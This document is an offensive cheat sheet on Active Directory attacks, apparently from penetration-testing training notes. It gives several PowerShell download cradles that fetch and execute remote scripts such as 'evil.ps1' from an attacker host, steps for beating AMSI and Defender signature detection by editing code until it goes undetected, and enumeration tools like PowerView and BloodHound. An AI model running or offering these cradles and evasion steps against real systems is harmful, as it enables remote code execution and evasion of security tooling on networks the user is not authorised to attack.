# Active Directory Attacks

## Powershell

### Load a Powershell Script

#### Dot Sourcing

```powershell
. C:\AD\Tools\PowerView.ps1
```

#### Import-Module

```powershell
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

#### List commands in a Module

```powershell
Get-Command -Module <modulename>
```
#### Execute Download Cradle

##### IEX

```powershell
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')

```

##### IE

```powershell
$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
````

##### PSv3 Onwards - IEX & IWR

```powershell
iex (iwr 'http://192.168.230.1/evil.ps1')
```

##### h

```powershell
$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex $h.responseText
```

##### iwr

```powershell
$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1") $r = $wr.GetResponse() IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```
##### Cradle Crafter

https://github.com/danielbohannon/Invoke-CradleCrafter

##### Bypass Execution Policy

https://www.netspi.com/blog/entryid/238/15-ways-to-bypass-the-powershell-execution-policy

### Bypass Powershell Security

#### Invisi-Shell

https://github.com/OmerYa/Invisi-Shell

##### Invisi-Shell with Admin Privileges

```powershell
RunWithPathAsAdmin.bat
```

##### Invisi-Shell with Non-Admin Privileges

```powershell
RunWithRegistryNonAdmin.bat
```

#### Bypassing AV Signatures

##### AMSITrigger

https://github.com/RythmStick/AMSITrigger

###### AMSITrigger Usage

```powershell
AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1
```

##### DefenderCheck

https://github.com/t3hbb/DefenderCheck

###### DefenderCheck Usage

```powershell
DefenderCheck.exe PowerUp.ps1
```

##### Full Obfuscation

https://github.com/danielbohannon/Invoke-Obfuscation

##### ProtectMyTooling

https://github.com/mgeeky/ProtectMyTooling

##### Beating Signature Detection

1. Scan using AMSITrigger
2. Modify the detected code snippet
3. Rescan using AMSITrigger
4. Repeat steps 2 & 3 untill result = "AMSI_RESULT_NOT_DETECTED" or "blank"

____________________________

## Domain Enumeration

### Tools for Enumeration

#### Active Directory PowerShell Module

https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps

https://github.com/samratashok/ADModule

```powershell
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
```
```powershell
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

#### BloodHound

https://github.com/BloodHoundAD/BloodHound

#### PowerView (PowerShell)

https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1

```powershell
. C:\AD\Tools\PowerView.ps1
```

#### SharpView (C#)

https://github.com/tevora-threat/SharpView/

#### Additional Tools

https://janikvonrotz.ch/2015/09/09/deploy-powershell-activedirectory-module-without-installing-the-remote-server-tools/

https://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html

